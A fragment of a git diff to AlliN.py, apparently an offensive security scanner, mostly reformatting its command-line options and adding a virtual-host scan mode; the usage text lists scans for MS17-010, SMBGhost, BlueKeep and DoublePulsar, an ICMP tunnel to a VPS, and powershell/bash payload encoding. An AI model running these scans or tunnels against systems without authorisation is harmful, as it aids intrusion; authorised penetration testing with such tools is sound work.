   /  /_\  \   |  |     |  |     |  | |  . `  | 
- /  _____  \  |  `----.|  `----.|  | |  |\   |  v2.2.1 #{0}
+ /  _____  \  |  `----.|  `----.|  | |  |\   |  v2.3.0 #{0}
 /__/     \__\ |_______||_______||__| |__| \__| 
 
-""".format(platform.python_version())
+""".format(
+            platform.python_version()
+        )
     else:
         logo = r"""
 
  █████╗ ██╗     ██╗     ██╗███╗   ██╗
 ██╔══██╗██║     ██║     ██║████╗  ██║
 ███████║██║     ██║     ██║██╔██╗ ██║
-██╔══██║██║     ██║     ██║██║╚██╗██║   v2.2.1 #{0}
+██╔══██║██║     ██║     ██║██║╚██╗██║   v2.3.0 #{0}
 ██║  ██║███████╗███████╗██║██║ ╚████║
 ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝╚═╝  ╚═══╝
-""".format(platform.python_version())
+""".format(
+            platform.python_version()
+        )
 
     print(info(logo))
 
+
 if __name__ == "__main__":
-    parse = optparse.OptionParser(usage="\"usage:%prog [options] arg1,arg2\""
-                                       "\npython AlliN.py --host 10.1.1.1 -p 80 -t 100 -o asd.txt --proxy http://127.0.0.1:8888"
-                                       "\npython AlliN.py --host 10.1.1.1-10.2.2.2 -p 80 -t 100 -o asd.txt"
-                                       "\npython AlliN.py --host 10.1.1.1-10.2.2.2 -p 80,443,8080 -t 100 -o asd.txt"
-                                       "\npython AlliN.py --host 10.1.1.1-10.2.2.2 -p 80,443,8000-9000 -t 100 -o asd.txt"
-                                       "\npython AlliN.py -f url.list -p 80,443,8000-9000 -t 100 -o asd.txt"
-                                       "\npython AlliN.py -u \"/login/index.jsp\" -p 80,443,8000-9000 -t 100"
-                                       "\npython AG3.py --uf path.txt -p 80,443,8000-9000 -t 100  --hidden 404,400"
-                                       "\npython AlliN.py -f xxx.list -t 100 # xxx.list 192.168.1.1:80"
-                                       "\npython AlliN.py --host 10.1.1.1/24 /16 /8 -p 80 -t 100 # CIDR"
-                                       "\npython AlliN.py --host 10.1.1.1/24 -p 80 -m pscan # port scan"
-                                       "\npython AlliN.py --host 10.1.1.1/24 -m 17scan # MS17-010 scan"
-                                       "\npython AlliN.py --host 10.1.1.1/24 -m gtscan # SMBGhost scan"
-                                       "\npython AlliN.py -m uncd -e f5 -s 185903296.21520.0000"
-                                       "\npython AlliN.py -q domain='example.com' -m fscan # fofa scan"
-                                       "\npython AlliN.py -q domain='example.com' -m fscan --fs 200 # fofa scan with size"
-                                       "\npython AlliN.py -m icmpt (establish a server conncat in your vps)"
-                                       "\npython AlliN.py -m icmpt --sip vps --cip 127.0.0.1 --cport 80 (forward you connect to your vps network)"
-                                       "\npython AlliN.py --host ww[fuzz].xxx.com -m ddscan (subdomain fuzz)"
-                                       "\npython AlliN.py --host ww[fuzz].xxx.com -m ddscan --dd (head scan)"
-                                       "\npython AlliN.py --host 192.168.1.1/24 -p 443 --nocert"
-                                       "\npython AlliN.py --host 192.168.1.1/24 -p 443 --hiddensize 0,7"
-                                       "\npython AlliN.py --host 192.168.1.1/24 -p 443 -m bakscan (bak file fuzz)"
-                                       "\npython AlliN.py --host 192.168.1.1/24 -p 443 -m bakscan --dd (head scan)"
-                                       "\npython AlliN.py --host 192.168.1.1/24 --nobar"
-                                       "\npython AlliN.py -q \"domain='xx.com'\" --host xxx.com -m sfscan"
-                                       , version="%prog 2.2.1")
-    parse.add_option("--host", dest="host", action="store", type="string", metavar="host", help="example: 192.168.1.1 /192.168.1.1-192.168.1.254")
-    parse.add_option("--domain", dest="domain", type="string", help="example: baidu.com in hostscan")
-    parse.add_option("--proxy", dest="proxy", type="string", help="use a proxy to connect, example: http://127.0.0.1:8001 socks5://127.0.0.1:1081")
-    parse.add_option("--timeout", dest="timeout", type="float", help="Set timeout", default=3.0)
-    parse.add_option("--ctimeout", dest="ctimeout", type="float", help="Set timeout of port scan", default=0.5)
-    parse.add_option("-p", dest="p", type="string", metavar="80,443 or 8080-9000", default="", help="Enter Scan Port")
-    parse.add_option("-t", dest="t", type="string", metavar="thread 200", default = "200", help="Set threads")
+    parse = optparse.OptionParser(
+        usage='"usage:%prog [options] arg1,arg2"'
+        "\npython AlliN.py --host 10.1.1.1 -p 80 -t 100 -o asd.txt --proxy http://127.0.0.1:8888"
+        "\npython AlliN.py --host 10.1.1.1-10.2.2.2 -p 80 -t 100 -o asd.txt"
+        "\npython AlliN.py --host 10.1.1.1-10.2.2.2 -p 80,443,8080 -t 100 -o asd.txt"
+        "\npython AlliN.py --host 10.1.1.1-10.2.2.2 -p 80,443,8000-9000 -t 100 -o asd.txt"
+        "\npython AlliN.py -f url.list -p 80,443,8000-9000 -t 100 -o asd.txt"
+        '\npython AlliN.py -u "/login/index.jsp" -p 80,443,8000-9000 -t 100'
+        "\npython AG3.py --uf path.txt -p 80,443,8000-9000 -t 100  --hidden 404,400"
+        "\npython AlliN.py -f xxx.list -t 100 # xxx.list 192.168.1.1:80"
+        "\npython AlliN.py --host 10.1.1.1/24 /16 /8 -p 80 -t 100 # CIDR"
+        "\npython AlliN.py --host 10.1.1.1/24 -p 80 -m pscan # port scan"
+        "\npython AlliN.py --host 10.1.1.1/24 -m 17scan # MS17-010 scan"
+        "\npython AlliN.py --host 10.1.1.1/24 -m gtscan # SMBGhost scan"
+        "\npython AlliN.py -m uncd -e f5 -s 185903296.21520.0000"
+        "\npython AlliN.py -q domain='example.com' -m fscan # fofa scan"
+        "\npython AlliN.py -q domain='example.com' -m fscan --fs 200 # fofa scan with size"
+        "\npython AlliN.py -m icmpt (establish a server conncat in your vps)"
+        "\npython AlliN.py -m icmpt --sip vps --cip 127.0.0.1 --cport 80 (forward you connect to your vps network)"
+        "\npython AlliN.py --host ww[fuzz].xxx.com -m ddscan (subdomain fuzz)"
+        "\npython AlliN.py --host ww[fuzz].xxx.com -m ddscan --dd (head scan)"
+        "\npython AlliN.py --host 192.168.1.1/24 -p 443 --nocert"
+        "\npython AlliN.py --host 192.168.1.1/24 -p 443 --hiddensize 0,7"
+        "\npython AlliN.py --host 192.168.1.1/24 -p 443 -m bakscan (bak file fuzz)"
+        "\npython AlliN.py --host 192.168.1.1/24 -p 443 -m bakscan --dd (head scan)"
+        "\npython AlliN.py --host 192.168.1.1/24 --nobar"
+        "\npython AlliN.py -q \"domain='xx.com'\" --host xxx.com -m sfscan",
+        version="%prog 2.3.0",
+    )
+    parse.add_option(
+        "--host",
+        dest="host",
+        action="store",
+        type="string",
+        metavar="host",
+        help="example: 192.168.1.1 /192.168.1.1-192.168.1.254",
+    )
+    parse.add_option(
+        "--domain", dest="domain", type="string", help="example: baidu.com in hostscan or vhostscan"
+    )
+    parse.add_option(
+        "--proxy",
+        dest="proxy",
+        type="string",
+        help="use a proxy to connect, example: http://127.0.0.1:8001 socks5://127.0.0.1:1081",
+    )
+    parse.add_option(
+        "--timeout", dest="timeout", type="float", help="Set timeout", default=3.0
+    )
+    parse.add_option(
+        "--ctimeout",
+        dest="ctimeout",
+        type="float",
+        help="Set timeout of port scan",
+        default=0.5,
+    )
+    parse.add_option(
+        "-p",
+        dest="p",
+        type="string",
+        metavar="80,443 or 8080-9000",
+        default="",
+        help="Enter Scan Port",
+    )
+    parse.add_option(
+        "-t",
+        dest="t",
+        type="string",
+        metavar="thread 200",
+        default="200",
+        help="Set threads",
+    )
     parse.add_option("-f", dest="f", type="string", help="Input a file")
     parse.add_option("-u", dest="u", type="string", help="Url path")
     parse.add_option("--project", dest="project", type="string", help="Project name")
     parse.add_option("--uf", dest="uf", type="string", help="Url path from file")
     parse.add_option("--sip", dest="sip", type="string", help="Server IP")
     parse.add_option("--cip", dest="cip", type="string", help="Connect IP")
-    parse.add_option("--cport", dest="cport", type="int", help="Connect Port", default=80)
-    parse.add_option("-e", dest="e",type="string", default="f5", help='''method of encode or decode
+    parse.add_option(
+        "--cport", dest="cport", type="int", help="Connect Port", default=80
+    )
+    parse.add_option(
+        "-e",
+        dest="e",
+        type="string",
+        default="f5",
+        help="""method of encode or decode
                                                 ————————————————
                                                  pw -> powershell encode
                                                  bh -> bash encode
                                                  f5 -> f5 decode
                                                  default is f5 decode
                                                 ————————————————
-                                                 ''')
+                                                 """,
+    )
     parse.add_option("-s", dest="s", type="string", help="String of decide")
-    parse.add_option("--hidden", dest="hidden", type="string", help = "Hide http code for urlpath")
-    parse.add_option("--fs", dest="fs", type="int", default=10000, help = "Size of each result number of fofa scan")
+    parse.add_option(
+        "--hidden", dest="hidden", type="string", help="Hide http code for urlpath"
+    )
+    parse.add_option(
+        "--fs",
+        dest="fs",
+        type="int",
+        default=10000,
+        help="Size of each result number of fofa scan",
+    )
     parse.add_option("--dd", dest="dd", action="store_true", help="Open head request")
-    parse.add_option("--nocert", dest="nocert", action="store_true", help="Close show cert url")
-    parse.add_option("--nobar", dest="nobar", action="store_true", help="Close the ProcessBar")
-    parse.add_option("--uninstall", dest="uninstall", action="store_true", help="Uninstall for doublepulsar")
-    parse.add_option("--verbose", dest="verbose", action="store_true", help="Version for doublepulsar")
-    parse.add_option("--hiddensize",dest="hiddensize", type="string", help="Hidden size")
-    parse.add_option("-q", dest="q", type="string", help="Domain for fofa example: domain=\"baidu.com\"")
-    parse.add_option("-H", dest="H", type="string", help="set header, example: -H \"key: value\"")
-    parse.add_option("-m", dest="m", type="string", default="tscan", help='''scan method
+    parse.add_option(
+        "--nocert", dest="nocert", action="store_true", help="Close show cert url"
+    )
+    parse.add_option(
+        "--nobar", dest="nobar", action="store_true", help="Close the ProcessBar"
+    )
+    parse.add_option(
+        "--uninstall",
+        dest="uninstall",
+        action="store_true",
+        help="Uninstall for doublepulsar",
+    )
+    parse.add_option(
+        "--verbose",
+        dest="verbose",
+        action="store_true",
+        help="Version for doublepulsar",
+    )
+    parse.add_option(
+        "--hiddensize", dest="hiddensize", type="string", help="Hidden size"
+    )
+    parse.add_option(
+        "-q",
+        dest="q",
+        type="string",
+        help='Domain for fofa example: domain="baidu.com"',
+    )
+    parse.add_option(
+        "-H", dest="H", type="string", help='set header, example: -H "key: value"'
+    )
+    parse.add_option(
+        "-m",
+        dest="m",
+        type="string",
+        default="tscan",
+        help="""scan method
                                                                    ————————————————
                                                                    tscan -> title
                                                                    pscan -> port scan
@@ -9474,6 +10923,7 @@ if __name__ == "__main__":
                                                                    sfscan -> subscan and fofascan (for one command)
                                                                    oxid -> multi-NIC
                                                                    hostscan -> hostscan
+                                                                   vhostscan -> url travserse based hostscan 
                                                                    icmp tunnel -> icmpt
                                                                    cdnscan -> cdn check
                                                                    dpscan -> doublepulsar backdoor check
@@ -9481,11 +10931,22 @@ if __name__ == "__main__":
                                                                    
                                                                    default is tscan
                                                                    ————————————————
-                                                                   ''')
-    parse.add_option("-o", dest="o", type="string", default="res_alivedomain.txt", help="Output a file,default outfile in res_alivedomain.txt")
-    parse.add_option("--oJ", dest="oJ", type="string", help="Ouput a json file, default in res_alivedomain.json")
+                                                                   """,
+    )
+    parse.add_option(
+        "-o",
+        dest="o",
+        type="string",
+        default="res_alivedomain.txt",
+        help="Output a file,default outfile in res_alivedomain.txt",
+    )
+    parse.add_option(
+        "--oJ",
+        dest="oJ",
+        type="string",
+        help="Ouput a json file, default in res_alivedomain.json",
+    )
     (options, args) = parse.parse_args()
-
 
     pring_logo()
 
@@ -9523,14 +10984,16 @@ if __name__ == "__main__":
         FOCUSFILE = open(os.path.join(filepath, "focuson.txt"), "ab+")
 
     if args.domain:
-        args.domain = args.domain.replace("https://", "").replace("http://", "").replace("/", "")
+        args.domain = (
+            args.domain.replace("https://", "").replace("http://", "").replace("/", "")
+        )
 
     if args.oJ:
         JSONFILE = True
         resAlivedomainFile = open(args.oJ, "ab+")
     else:
         resAlivedomainFile = open(args.o, "ab+")
-    
+
     print(info("Timelocal: ") + localtimes + " | " + info("Threads: ") + str(args.t))
 
     # set proxy
@@ -9538,13 +11001,14 @@ if __name__ == "__main__":
         proxy_type, proxy_host = args.proxy.split("://")
         if "socks5" in proxy_type.lower():
             try:
+                # TODO: independence pysocks
                 import socks
                 from sockshandler import SocksiPyHandler
             except ImportError:
                 print("No module named socks, please install socks first")
                 sys.exit(0)
             proxy_h, proxy_port = proxy_host.split(":")
-            socks.set_default_proxy(socks.SOCKS5, proxy_h, int(proxy_port) )
+            socks.set_default_proxy(socks.SOCKS5, proxy_h, int(proxy_port))
             socket.socket = socks.socksocket
 
         elif "socks4" in proxy_type.lower():
@@ -9558,11 +11022,14 @@ if __name__ == "__main__":
             socks.set_default_proxy(socks.SOCKS4, proxy_h, int(proxy_port))
             socket.socket = socks.socksocket
         else:
-            proxy = urllib2.ProxyHandler({proxy_type:  "http://" + proxy_host, "https": "http://" + proxy_host})
+            proxy = urllib2.ProxyHandler(
+                {proxy_type: "http://" + proxy_host, "https": "http://" + proxy_host}
+            )
             opener = urllib2.build_opener(proxy)
             urllib2.install_opener(opener)
 
-    else: proxy_type = proxy_host = None
+    else:
+        proxy_type = proxy_host = None
 
     # --------- Port scope ------------
     if args.p == "-":
@@ -9570,59 +11037,68 @@ if __name__ == "__main__":
     listPort = parse_range_int(args.p)
 
     if args.uf:
-       args.u = openUrlFile(args.uf)
-       
+        args.u = openUrlFile(args.uf)
+
     if args.m == "bakscan":
         if not args.hidden:
             args.hidden = "404"
-       
 
     if args.m == "ddscan":
         AG3(args.f, args.m, listPort, args.t, "file", args.o, args.u)
         sys.exit(0)
     if args.f:
-       # file　channel
+        # file　channel
         if args.m == "sscan":
             args.m = "tscan"
         print(info("\t\t[+] " + args.m + " mode"))
-        AG3(args.f, args.m, listPort, args.t, "file",args.o, args.u)
+        AG3(args.f, args.m, listPort, args.t, "file", args.o, args.u)
     if args.m == "uncd":
-         hcode(args.e, args.s)
+        hcode(args.e, args.s)
     elif args.m == "infoscan":
-        print(r"""
+        print(
+            r"""
             _____       ________
             ___(_)_________  __/________________________ _______
             __  /__  __ \_  /_ _  __ \_  ___/  ___/  __ `/_  __ \
             _  / _  / / /  __/ / /_/ /(__  )/ /__ / /_/ /_  / / /
             /_/  /_/ /_//_/    \____//____/ \___/ \__,_/ /_/ /_/
-        """)
+        """
+        )
 
-        domain = args.host.replace("http://", "").replace("https://", "").replace("www.", "").strip("/")
+        domain = (
+            args.host.replace("http://", "")
+            .replace("https://", "")
+            .replace("www.", "")
+            .strip("/")
+        )
         filename = domain + "-" + str(int(time.time())) + ".html"
         infoprocess(filename, domain)
 
-        print("finish! result saved in %s"%filename+ " "*10)
+        print("finish! result saved in %s" % filename + " " * 10)
         progress.dones()
 
         try:
             import webbrowser
+
             path = os.getcwd()
             file = "file://" + path + "/" + filename
             webbrowser.open(file)
         except:
             pass
-        
+
         # all tasks has done
 
-    elif args.m == "fscan" or args.m == "sfscan" :
-        print(r"""
+    elif args.m == "fscan" or args.m == "sfscan":
+        print(
+            r"""
                   __        __
                  / _| ___  / _| __ _ ___  ___ __ _ _ __
                 | |_ / _ \| |_ / _` / __|/ __/ _` | "_ \
                 |  _| (_) |  _| (_| \__ \ (_| (_| | | | |
                 |_|  \___/|_|  \__,_|___/\___\__,_|_| |_|         
 
-            """)
+            """
+        )
         fofa_size = args.fs
 
         if type(args.u) == str:
@@ -9640,14 +11116,16 @@ if __name__ == "__main__":
         hostlist = [args.host]
 
         if args.m == "pscan":
-            print("""
+            print(
+                """
             _|_|_|                          _|      
             _|    _|    _|_|    _|  _|_|  _|_|_|_|  
             _|_|_|    _|    _|  _|_|        _|      
             _|        _|    _|  _|          _|      
             _|          _|_|    _|            _|_|  
 
-            """)
+            """
+            )
             AG3(hostlist, args.m, listPort, args.t, "list", args.o, args.u)
         elif args.m == "tscan":
             AG3(hostlist, args.m, listPort, args.t, "list", args.o, args.u)
@@ -9656,7 +11134,8 @@ if __name__ == "__main__":
             AG3(hostlist, args.m, listPort, args.t, "list", args.o, args.u)
 
         elif args.m == "17scan":
-            print("""
+            print(
+                """
                             _____ _______        _______ _____ _______
             .--------.-----| _   |   _   |______|   _   | _   |   _   |
             |        |__ --|.|   |___|   |______|.  |   |.|   |.  |   |
@@ -9664,7 +11143,8 @@ if __name__ == "__main__":
                              |:  | |   |        |:  1   | |:  |:  1   |
                              |::.| |   |        |::.. . | |::.|::.. . |
                              `---' `---'        `-------' `---`-------'
-                           """)
+                           """
+            )
             if PYVERSION > "3.0":
                 print("Python3 detected")
                 print("Run this script with Python 2.x !")
@@ -9672,9 +11152,9 @@ if __name__ == "__main__":
 
             AG3(hostlist, args.m, listPort, args.t, "list", args.o, args.u)
 
-
         elif args.m == "dpscan":
-            print(r"""
+            print(
+                r"""
                  ___    ____    _____   __   ____  ____  
                 |   \  |    \  / ___/  /  ] /    ||    \ 
                 |    \ |  o  )(   \_  /  / |  o  ||  _  |
@@ -9682,16 +11162,18 @@ if __name__ == "__main__":
                 |     ||  |    /  \ /   \_ |  _  ||  |  |
                 |     ||  |    \    \     ||  |  ||  |  |
                 |_____||__|     \___|\____||__|__||__|__|
-                           """)
+                           """
+            )
             if PYVERSION > "3.0":
                 print("Python 3 detected")
                 print("Run this script with Python 2.x !")
-                sys.exit() # exit no problem
-            
+                sys.exit()  # exit no problem
+
             AG3(hostlist, args.m, listPort, args.t, "list", args.o, args.u)
 
         elif args.m == "nbscan":
-            print("""
+            print(
+                """
                          88                                                           
                          88                                                           
                          88                                                           
@@ -9700,11 +11182,14 @@ if __name__ == "__main__":
             88       88  88       d8   `"Y8ba,   8b          ,adPPPPP88  88       88  
             88       88  88b,   ,a8"  aa    ]8I  "8a,   ,aa  88,    ,88  88       88  
             88       88  8Y"Ybbd8"'   `"YbbdP"'   `"Ybbd8"'  `"8bbdP"Y8  88       88  
-                           """)
+                           """
+            )
             AG3(hostlist, args.m, listPort, args.t, "list", args.o, args.u)
 
         elif args.m == "0708scan":
-            print(info(r"""
+            print(
+                info(
+                    r"""
                 
             0708.---.   ,--,    .--.  .-. .-. 
                ( .-._).' .')   / /\ \ |  \| | 
@@ -9714,47 +11199,56 @@ if __name__ == "__main__":
               `----'    \____\|_|  (_)/(  (_) 
                                      (__)     
 
-            """))
+            """
+                )
+            )
             AG3(hostlist, args.m, listPort, args.t, "list", args.o, args.u)
 
         elif args.m == "gtscan":
-            print(r""" 
+            print(
+                r""" 
                  _____ _____  ____  ____  ____  _     
             /  __//__ __\/ ___\/   _\/  _ \/ \  /|
             | |  _  / \  |    \|  /  | / \|| |\ ||
             | |_//  | |  \___ ||  \_ | |-||| | \||
             \____\  \_/  \____/\____/\_/ \|\_/  \|
                                       
-                """)
+                """
+            )
             AG3(hostlist, args.m, listPort, args.t, "list", args.o, args.u)
-
 
         # Reference: https://github.com/Rvn0xsy/OXID-Find
         elif args.m == "oxid":
-            print(info(r"""
+            print(
+                info(
+                    r"""
                _|_|    _|      _|  _|_|_|  _|_|_|    
              _|    _|    _|  _|      _|    _|    _|  
              _|    _|      _|        _|    _|    _|  
              _|    _|    _|  _|      _|    _|    _|  
                _|_|    _|      _|  _|_|_|  _|_|_|    
-                    """))
+                    """
+                )
+            )
 
             AG3(hostlist, args.m, listPort, args.t, "list", args.o, args.u)
-            
+
         elif args.m == "subscan":
-            print("""
+            print(
+                """
             .d8888. db    db d8888b. .d8888.  .o88b.  .d8b.  d8b   db 
             88'  YP 88    88 88  `8D 88'  YP d8P  Y8 d8' `8b 888o  88 
             `8bo.   88    88 88oooY' `8bo.   8P      88ooo88 88V8o 88 
               `Y8b. 88    88 88~~~b.   `Y8b. 8b      88~~~88 88 V8o88 
             db   8D 88b  d88 88   8D db   8D Y8b  d8 88   88 88  V888 
             `8888Y' ~Y8888P' Y8888P' `8888Y'  `Y88P' YP   YP VP   V8P
-                           """)
+                           """
+            )
             AG3(hostlist, args.m, listPort, args.t, "list", args.o, args.u)
-        
 
         elif args.m == "bakscan":
-            print(r"""
+            print(
+                r"""
                         
               _           _                        
              | |         | |                       
@@ -9764,10 +11258,12 @@ if __name__ == "__main__":
              |_.__/ \__,_|_|\_\___/\___\__,_|_| |_|
                                                    
                                                    
-            """)
+            """
+            )
             AG3(hostlist, args.m, listPort, args.t, "list", args.o, args.u)
         elif args.m == "cdnscan":
-            print(r"""
+            print(
+                r"""
 
               ________  _  __                
              / ___/ _ \/ |/ /__ _______ ____ 
@@ -9775,32 +11271,50 @@ if __name__ == "__main__":
             \___/____/_/|_/___/\__/\_,_/_//_/
                                             
                                                    
-            """)
+            """
+            )
             AG3(hostlist, args.m, listPort, args.t, "list", args.o, args.u)
 
         elif args.m == "shscan":
-            print(info(r"""
+            print(
+                info(
+                    r"""
                    .__                                 
               _____|  |__   ______ ____ _____    ____  
              /  ___/  |  \ /  ___// ___\\__  \  /    \ 
              \___ \|   Y  \\___ \\  \___ / __ \|   |  \
             /____  >___|  /____  >\___  >____  /___|  /
                  \/     \/     \/     \/     \/     \/ 
-            """))
+            """
+                )
+            )
             AG3(hostlist, args.m, listPort, args.t, "list", args.o, args.u)
 
-
     elif args.m == "icmpt":
-        print(info(r"""
+        print(
+            info(
+                r"""
             _____ _____ __  __ _____ _________ 
             |_   _/ ____|  \/  |  __ \__   __|
               | || |    | \  / | |__) | | |   
               | || |    | |\/| |  ___/  | |   
              _| || |____| |  | | |      | |   
             |_____\_____|_|  |_|_|      |_|   
-        """))
+        """
+            )
+        )
 
-        AG3(hostlist, args.m, listPort, args.t, "nothread", args.o, args.sip, icconip=args.cip, icconport=args.cport)
+        AG3(
+            hostlist,
+            args.m,
+            listPort,
+            args.t,
+            "nothread",
+            args.o,
+            args.sip,
+            icconip=args.cip,
+            icconport=args.cport,
+        )
 
     resAlivedomainFile.close()
     if GLOBALPROJECTFLAG:
